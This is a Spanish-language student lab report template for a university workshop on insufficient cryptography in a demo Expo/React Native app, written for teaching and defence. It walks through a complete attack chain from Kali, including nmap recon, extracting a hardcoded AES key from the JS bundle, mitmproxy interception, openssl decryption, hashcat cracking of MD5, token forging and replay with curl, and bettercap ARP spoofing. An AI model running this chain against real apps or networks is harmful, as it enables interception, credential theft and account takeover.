# TALLER PRÁCTICO

## Criptografía Insuficiente en App Móvil — Detección y Explotación desde Kali

**Expo / React Native (ServiGo) · CWE-319, CWE-321, CWE-327, CWE-328, CWE-330 · mitmproxy · openssl · hashcat · bettercap**

- **Docente:** Luis Ángel Ramírez Mendoza
- **Estudiantes:** Juan Carlos Añez Ahumada, Iván Jesus Martinez Molina
- **Fecha de entrega:** [fecha según convocatoria]
- **Entorno:** laboratorio aislado. App de demostración ServiGo corriendo en Expo Go (iPhone) + backend local en la PC Windows; atacante Kali en VirtualBox (red puente, misma LAN). Uso exclusivamente académico y defensivo.
- **AVISO ÉTICO:** todas las técnicas se ejecutaron únicamente contra la app de demostración y el backend propios del laboratorio, en una red controlada. Su uso contra sistemas ajenos sin autorización es ilegal.

---

## Enlace del video (10-12 minutos)

- **ENLACE DEL VIDEO:** [enlace de Drive/YouTube]
- **Duración:** [duración final] | **Orden 1-8 verificado: Sí** | **Terminal de Kali + iPhone visibles: Sí**
- Escenas grabadas en orden: 1 recon nmap · 2 clave en bundle · 3 interceptación mitmproxy · 4 descifrado openssl · 5 crack MD5 · 6 replay/forja de token · 7 tampering · 8 ARP bonus (si aplica).

---

## 1. Objetivo

### 1.1 General

Detectar y explotar vulnerabilidades de **criptografía insuficiente** en una aplicación móvil (Expo/React Native), desde una máquina atacante Kali, recuperando datos personales, credenciales y control de la sesión de usuario en un entorno controlado.

### 1.2 Específicos y competencias

- Comprender criptografía aplicada a móvil: confidencialidad, integridad, autenticidad, IV, modos de operación, hashing y tokens.
- Identificar CWE-321 (clave hardcodeada en el código), CWE-327 (algoritmo/modo débil), CWE-328 (hash débil), CWE-319 (transmisión sin cifrar/TLS) y CWE-330 (tokens predecibles/sin firma).
- Extraer el bundle JavaScript de un servidor de desarrollo Expo (`manifest` → `entry.bundle`) y analizarlo con `grep`.
- Interceptación de tráfico móvil con `mitmproxy` configurando proxy manual en iOS.
- Romper AES-ECB con `openssl` usando la clave recuperada, y crackear MD5+salt con `hashcat`.
- Ejecutar replay de sesión, forja de token (base64) y tampering de payloads.
- Documentar evidencias reproducibles (comandos + salidas) en informe y video.

---

## 2. Entorno de laboratorio real

### 2.1 Red y máquinas

| Rol | Detalle | Valor |
|---|---|---|
| Atacante | Kali Linux 2026.1 en VirtualBox, **red Puente** al adaptador Intel Wireless-AC 9560, promiscua allow-all | `<KALI>/24` (verificar con `ip a`) |
| Víctima (servidor) | Windows 11 24H2 Build 26200, WiFi Loreley_5G — Metro Expo + backend Node | `192.168.100.11` |
| Víctima (app) | iPhone con **Expo Go** (SDK 57), app ServiGo, misma WiFi | `<IPHONE>` (escena 1) |
| Puertos expuestos | Metro dev server (8081), API de autenticación (5000, HTTP plano) | TCP |

> Durante las escenas 3-4 el iPhone usa **proxy manual** hacia Kali:8080 (mitmproxy).

### 2.2 Herramientas

| Herramienta | Uso en el taller | Estado |
|---|---|---|
| nmap | Descubrimiento y fingerprint de puertos | Kali base |
| curl + python3 | Manifest Expo y descarga del bundle | Kali base |
| grep / strings | Extracción de clave y constantes de crypto | Kali base |
| mitmproxy (mitmdump) | Interceptación HTTP del login y refresh de sesión | `apt install mitmproxy` |
| openssl | Descifrado AES-128-ECB con clave robada | Kali base |
| hash-identifier + hashcat | Identificación y crackeo de MD5+salt (rockyou) | `apt install hashcat` |
| bettercap + tcpdump | (Bonus) MITM activo por ARP | `apt install bettercap` |
| Backend `server.js` | API Node (HTTP, sin TLS) que la app usa | Node en Windows |
| App `parcial-app-crypto-lab` | Expo/React Native en Expo Go (iOS) | `npm start` |

---

## 3. Metodología y estado final

| Video | Escena (KALI_GUIA) | Tipo | CWE | Evidencia |
|---|---|---|---|---|
| 1 | Recon: `nmap -sn` + `nmap -sV -p 8081,5000` | Detección | — | Puertos 8081/5000 identificados |
| 2 | Bundle JS: manifest → `grep` clave y algoritmos | Detección | CWE-321/327/328 | `Serv1Go#2026Key!`, `SG-Parcial-2026:`, `CryptoJS.mode.ECB` |
| 3 | mitmproxy: captura de login y refresh | Detección | CWE-319 | `POST /api/login` HTTP plano con `payload` base64 |
| 4 | `openssl enc -aes-128-ecb -d -K` | **Acceso** | CWE-327/329 | JSON con nombre, teléfono, dirección, GPS, hash |
| 5 | `hash-identifier` + `hashcat -m 20` | **Acceso** | CWE-328 | Contraseña `123456` recuperada |
| 6 | Replay del payload + forja de token base64 | **Acceso** | CWE-330/294 | `GET /api/profile` responde con la víctima |
| 7 | Alterar JSON, recifrar y reenviar | **Acceso** | Integridad | Dirección modificada persistida por el servidor |
| 8 | (Bonus) bettercap ARP + tcpdump | **Acceso** | CWE-319 | Payload capturado sin tocar el dispositivo |

---

## 4. Desarrollo con resultados reales

### 4.1 Conectividad y recon (escena 1)

```bash
ip a | grep inet
nmap -sn 192.168.100.0/24
nmap -sV -p 8081,5000 192.168.100.11
```

**Resultado real:** _[pegar salida: hosts descubiertos + `8081/tcp open http Express`, `5000/tcp open http` ]_

**Análisis:** el servidor de desarrollo de Expo y la API quedan expuestos a la red LAN sin segmentación; la API no anuncia TLS.

### 4.2 Detección estática: clave y algoritmos en el bundle (escena 2)

```bash
URL=$(curl -s http://192.168.100.11:8081/ -H 'expo-platform: ios' -H 'Accept: application/expo+json' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['launchAsset']['url'])")
curl -s "$URL" -o /tmp/bundle.js
grep -n 'SECRET_KEY' /tmp/bundle.js | head -3
grep -o "Serv1Go[^']*" /tmp/bundle.js
grep -o 'SG-Parcial-2026:[^"]*' /tmp/bundle.js | head -1
```

**Resultado real:** _[pegar salida: `var SECRET_KEY = 'Serv1Go#2026Key!'` y `var MD5_SALT = 'SG-Parcial-2026:'` ]_

**Análisis (CWE-321/327/328):** la clave AES-128 no sale del dispositivo: viaja dentro del propio bundle descargable por cualquier usuario de la red. El modo ECB no necesita IV (determinista) y MD5 no es apto para contraseñas.

### 4.3 Interceptación con mitmproxy (escena 3)

```bash
mitmdump -p 8080 -w /tmp/app.flow
# iPhone: Ajustes → Wi-Fi → proxy manual → <KALI>:8080  → login en la app → reabrir app → Ctrl+C
mitmdump -r /tmp/app.flow | tee /tmp/flows.txt
grep -o '"payload":"[^"]*"' /tmp/flows.txt | head -1 | cut -d'"' -f4 > /tmp/payload.b64
```

**Resultado real:** _[pegar salida: `POST /api/login HTTP/1.1` hacia `http://192.168.100.11:5000` + conteo de `api/session/refresh` ]_

**Análisis (CWE-319):** credenciales y PII viajan sin TLS; el "cifrado" del cuerpo no aporta confidencialidad porque la clave viaja en el cliente.

### 4.4 Explotación: descifrado del payload (escena 4)

```bash
echo -n 'Serv1Go#2026Key!' | xxd -p | tr -d '\n'
# → 5365727631476f23323032364b657921
base64 -d /tmp/payload.b64 > /tmp/payload.enc
openssl enc -aes-128-ecb -d -K 5365727631476f23323032364b657921 -in /tmp/payload.enc -out /tmp/payload.json
python3 -m json.tool /tmp/payload.json
```

**Resultado real:** _[pegar JSON con name/phone/address/latitude/passwordHash — ofuscar solo si el docente lo pide ]_

**Demostración CWE-329 (sin IV):**

```bash
echo -n 'ServiGo Riohacha' | openssl enc -aes-128-ecb -K <clave_hex> | xxd   # x2 → idénticos
```

### 4.5 Explotación: crack del hash (escena 5)

```bash
hash-identifier <<< '19525d22b8d082bcfeb5017de68f8171'
echo '19525d22b8d082bcfeb5017de68f8171:SG-Parcial-2026:' > /tmp/hash.txt
hashcat -m 20 -a 0 -D 1 /tmp/hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 20 /tmp/hash.txt --show
```

**Resultado real:** _[pegar salida de `--show` con `::123456` ]_

**Análisis (CWE-328):** MD5 + salt fija ≈ 10⁶ operaciones por candidato; `rockyou` cubre contraseñas de baja entropía de inmediato.

### 4.6 Explotación: replay de sesión y forja de token (escena 6)

```bash
PAY=$(cat /tmp/payload.b64)
curl -s -X POST http://192.168.100.11:5000/api/login -H 'Content-Type: application/json' \
  -d "{\"payload\":\"$PAY\"}" | tee /tmp/login_resp.json
TOKEN=$(python3 -c "import json;print(json.load(open('/tmp/login_resp.json'))['token'])")
curl -s http://192.168.100.11:5000/api/profile -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
echo "$TOKEN" | base64 -d; echo
FORGED=$(printf '{"email":"cliente@test.com","role":"CLIENT"}' | base64 -w0)
curl -s http://192.168.100.11:5000/api/profile -H "Authorization: Bearer $FORGED" | python3 -m json.tool
```

**Resultado real:** _[pegar: perfil de la víctima + claims decodificados + perfil vía token forjado ]_

**Análisis (CWE-330/CWE-294):** el token no está firmado ni tiene expiración/nonce; el replay del payload es aceptado indefinidamente.

### 4.7 Explotación: tampering del payload (escena 7)

```bash
# modificar dirección → recifrar con la clave robada → reenviar → consultar perfil
```
_Comandos completos en `KALI_GUIA.md` escena 7._

**Resultado real:** _[pegar respuesta con `"address": "Calle Falsa 123 (modificada por el atacante)"` ]_

**Análisis:** sin integridad (MAC/AEAD) ni validación servidor-side, el atacante controla el contenido persistido.

### 4.8 Bonus: MITM activo por ARP (escena 8, si se ejecutó)

```bash
sudo bettercap -iface eth0 -eval "set arp.spoof.targets <IPHONE>; arp.spoof on; net.sniff on"
sudo tcpdump -i eth0 -A -s0 'tcp port 5000 and host 192.168.100.11'
```

**Resultado real:** _[pegar línea `POST /api/login` con payload visible en tcpdump, o "omitida: el AP aísla clientes" ]_

---

## 5. Análisis de vulnerabilidades (mapa CWE)

| CWE | Nombre | Evidencia en el video | Impacto | Remediación propuesta |
|---|---|---|---|---|
| CWE-321 | Uso de clave criptográfica hardcodeada | Escena 2 | Cualquier usuario descifra todo | Claves en Keychain/Keystore + intercambio seguro en servidor |
| CWE-319 | Transmisión de información sensible en claro | Escenas 3, 8 | PII y credenciales interceptables | HTTPS/TLS con certificate pinning |
| CWE-327 | Uso de algoritmo/modo criptográfico débil (AES-ECB, sin IV) | Escenas 2, 4 | Patrones y determinismo del cifrado | AES-GCM con IV aleatorio por mensaje (o cifrado del SO) |
| CWE-328 | Uso de hash débil (MD5) | Escenas 2, 5 | Recuperación de contraseñas | bcrypt/scrypt/Argon2 con parámetros de costos |
| CWE-330 | Generación/validación insuficiente de tokens (base64 sin firma) | Escena 6 | Suplantación total de identidad | JWT firmado (HS256/RS256) + exp/nonce |
| CWE-294 | Replay de autenticación | Escena 6 | Reutilización de credenciales | Timestamp+nonce en el servidor, una-sola-uso |

### 5.x Respuestas del taller (completar con las preguntas del docente)

_Fase 1 — Detección:_
1. _[pregunta]_ R: _[respuesta con referencia a la escena/evidencia]_
2. _[pregunta]_ R: …

_Fase 2 — Explotación:_
3. … _[respuestas 3-N]_

---

## 6. Videos y entregables

| Entregable | Ubicación / enlace |
|---|---|
| Video (10-12 min, escenas 1-8) | [enlace] |
| Informe (este documento) | `INFORME_FINAL_TALLER_CRIPTOGRAFIA_MOVIL.*` |
| App de demostración + backend + guía de Kali | `C:\Proyectos\desarrolloMovil\parcial-app-crypto-lab\` (`KALI_GUIA.md`, `SETUP_CHECKLIST.md`, `server/`) |
| Capturas de respaldo | [carpeta de capturas / anexo] |

**Recordatorios finales de grabación:**
- Terminal de Kali con fuente legible y orden de escenas 1→8.
- Mostrar el iPhone (proxy activo durante 3-4) y **desactivar el proxy al terminar**.
- El video no debe requerir edición: los 8 pasos se ejecutan en orden en una sola sesión.
